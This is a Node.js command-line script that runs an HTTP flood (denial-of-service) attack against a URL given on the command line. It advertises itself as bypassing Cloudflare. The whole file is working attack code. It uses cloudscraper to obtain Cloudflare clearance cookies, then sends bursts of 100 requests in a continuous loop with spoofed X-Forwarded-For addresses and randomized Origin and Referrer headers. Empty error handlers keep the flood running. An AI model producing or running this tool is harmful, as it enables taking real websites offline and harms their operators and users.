var colors = require('colors');
const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require('randomstring');
if (process.argv.length !== 4){
console.log("Bypass CF by Chaos !")
console.log("node ddosrand.js url time");
process.exit(0);
}
var url = process.argv[2];
var time = process.argv[3];
function main_process(){
var cookie = '';
var useragent = '';
var color = [colors.green,colors.underline.red,colors.rainbow,colors.trap]
function main(){
var colors = color[Math.floor(Math.random()*color.length)];
var option = {url:url,resolveWithFullResponse: true}
cloudscraper.get(option,function(e,r,b){
if (e){
console.log('Host Error !!!!')}
var parsed = JSON.parse(JSON.stringify(r));
useragent = (parsed['request']['headers']['User-Agent'])
cookie = (parsed['request']['headers']['cookie'])
if(cookie == undefined){
cookie = (parsed['headers']['set-cookie'])
}
//console.log(cookie,useragent)
var char = randomstring.generate({
length:10,
charset:'abcdefghijklmnopqstuvwxyz0123456789'
})
//console.log(char)
ipq = function ranip(){
return Math.round(Math.random()*256)
}
var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
//console.log(ip)
var config = {
url:url,
method:'get',
headers:{
'User-Agent': useragent,
'Upgrade-Insecure-Requests': '1',
'cookie': cookie,
'Origin': 'http://' + char + '.com',
'Referrer': 'http://google.com/' + char,
'X-Forwarded-For': ip
}
}
for(let i=0;i<100;i++){
request(config,function(e,r){
console.log(colors(r.statusCode+" "+"Attack !"));
})
}
})
}
setInterval(()=>{main()})
setTimeout(()=>{process.exit()},time*1000)
}
main_process()
process.on('uncaughtException', function(err) {
    
});

process.on('unhandledRejection', function(err) {
    
})
